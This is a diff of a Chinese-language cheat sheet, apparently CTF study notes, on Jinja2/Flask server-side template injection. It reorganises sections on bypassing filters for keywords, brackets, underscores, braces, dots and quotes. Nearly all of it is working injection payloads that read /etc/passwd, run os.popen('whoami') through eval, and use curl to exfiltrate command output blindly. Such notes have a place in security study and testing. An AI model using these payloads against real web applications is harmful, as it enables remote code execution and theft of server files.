@@ -54,6 +54,9 @@ replace |	替换字符串的值
 round |	默认对数字进行四舍五入，也可以用参数进行控制
 int |	把值转换成整型
 
+
+![U8dRSJ.png](https://s1.ax1x.com/2020/07/12/U8dRSJ.png)
+
 使用方法
 ```python
 { { "cl0ss"|replace("0","a") } }
@@ -122,28 +125,54 @@ for c in _list:
 
 # 二、 绕过
 
+## ① 关键字绕过
 
-
-## ① 单双引号过滤
 ```python
-__init__.__globals__['__builtins__']
-# 转化成如下形式
-__init__.__globals__.__builtins__
+'X19jbGFzc19f'.decode('base64')
 ```
 
-使用"request.args" 或者 "request.values"
-python2 读举例
+**字符串拼接绕过**
 ```python
-?name={ { ().__class__.__bases__[0].__subclasses__()[40](request.args.aa).read()} }&aa=/etc/passwd
-```
-values 同理 数据为post
-
-还可用set 语句
-```python
-{ % set chr=[].__class__.__base__.__subclasses__()[61].__init__.__globals__.__builtins__.chr % }{ { [].__class__.__base__.__subclasses__()[40](chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()} }
+'__buil'+'tins__'
 ```
 
-## ② 下划线过滤
+**format函数**
+```python
+'fl{0}g'.format('a')
+```
+
+![YoyfG6.png](https://s1.ax1x.com/2020/05/20/YoyfG6.png)
+
+截取字符
+```python
+request.__doc__[1]
+```
+
+利用python 切片操作
+```python
+"metsys"[::-1]
+```
+
+利用过滤器join
+```python
+('sys','tem')|join
+```
+
+利用过滤器 replace
+```python
+"sysxem"|replace('x','t')
+```
+
+用其他可控变量代替
+
+## ② 中括号被过滤
+
+利用该特性a\[2]== a.\_\_getitem__(2)
+```python
+{ { ().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(40)('/etc/passwd').read()} }
+```
+
+## ③ 下划线过滤
 **使用"request.args" 或者 "request.values"**
 ```python
 ?name={ { [][request.args.class][request.args.base][request.args.sub]()[40]('/etc/passwd').read()} }&class=__class__&base=__base__&sub=__subclasses__
@@ -155,6 +184,8 @@ values 同理 数据为post
 { { request.headers['X-Forwarded-For']} }
 ```
 ![Yo6Wwj.png](https://s1.ax1x.com/2020/05/20/Yo6Wwj.png)
+
+更简单的如`request.content_md5`,`request.content_encoding`,`request.referrer` 等其他
 
 **畸形方法获取_**
 ```python
@@ -181,14 +212,9 @@ values 同理 数据为post
 ```
 ![Yor8W8.png](https://s1.ax1x.com/2020/05/20/Yor8W8.png)
 
-## ③ 中括号被过滤
 
-利用该特性a\[2]== a.\_\_getitem__(2)
-```python
-{ { ().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(40)('/etc/passwd').read()} }
-```
 
-## ④ 双中括号过滤
+## ④ 双大括号过滤
 利用{ % % }
 ```python
 { % if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' % }1{ % endif % }
@@ -196,24 +222,8 @@ values 同理 数据为post
 相当于盲命令执行，利用curl将执行结果带出来
 或者而类似布尔注入
 
-## ⑤ 关键字绕过
-**base64编码绕过**
-\_\_getattribute__使用实例访问属性时,调用该方法
-```python
-{ { [].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()} }
-```
 
-**字符串拼接绕过**
-```python
-[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__buil'+'tins__']
-```
-
-**format函数**
-```python
-{ { 'fl{0}g'.format('a') } }
-```
-![YoyfG6.png](https://s1.ax1x.com/2020/05/20/YoyfG6.png)
-## ⑥ . 被过滤
+## ⑤ . 被过滤
 使用原生JinJa2函数|attr()
 ```python
 ?name={ { ()[(request|attr("args"))["class"]][(request|attr("args"))["base"]][(request|attr("args"))["sub"]]()[40]('/etc/passwd').read()} }&class=__class__&base=__base__&sub=__subclasses__
@@ -237,6 +247,48 @@ values 同理 数据为post
 ```
 ![Yo0pqI.png](https://s1.ax1x.com/2020/05/20/Yo0pqI.png)
 
+## ⑥ 单双引号过滤
+```python
+__init__.__globals__['__builtins__']
+# 转化成如下形式
+__init__.__globals__.__builtins__
+```
+
+使用"request.args" 或者 "request.values" 亦或者前面的例子
+python2 读举例
+```python
+?name={ { ().__class__.__bases__[0].__subclasses__()[40](request.args.aa).read()} }&aa=/etc/passwd
+```
+values 同理 数据为post
+
+还可用set 语句
+```python
+{ % set chr=[].__class__.__base__.__subclasses__()[61].__init__.__globals__.__builtins__.chr % }{ { [].__class__.__base__.__subclasses__()[40](chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()} }
+```
+
+
+## ⑦ []、引号、下划线绕过
+
+```python
+()|attr(request.values.cla)|attr(request.values.base)|attr(request.values.sub)
+()|attr(request.values.geti)
+(59)|attr(request.values.init)|attr(request.values.glob)|attr(request.values.get
+i)(request.values.buil)|attr(request.values.geti)(request.values.eval)
+(request.values.cmd)
+```
+post data
+```
+cla=__class__&base=__base__&sub=__subclasses__&geti=__getitem__&init=__init__&gl
+ob=__globals__&buil=__builtins__&eval=eval&cmd=__import__("os").popen("whoami").
+read()
+```
+
+
+利用attr
+![U3wQPg.png](https://s1.ax1x.com/2020/07/12/U3wQPg.png)
+
+![U3wlGQ.png](https://s1.ax1x.com/2020/07/12/U3wlGQ.png)
+因为中括号原因 需要用getitem方法获取` __builtins__` 和 `eval`
 
 
 
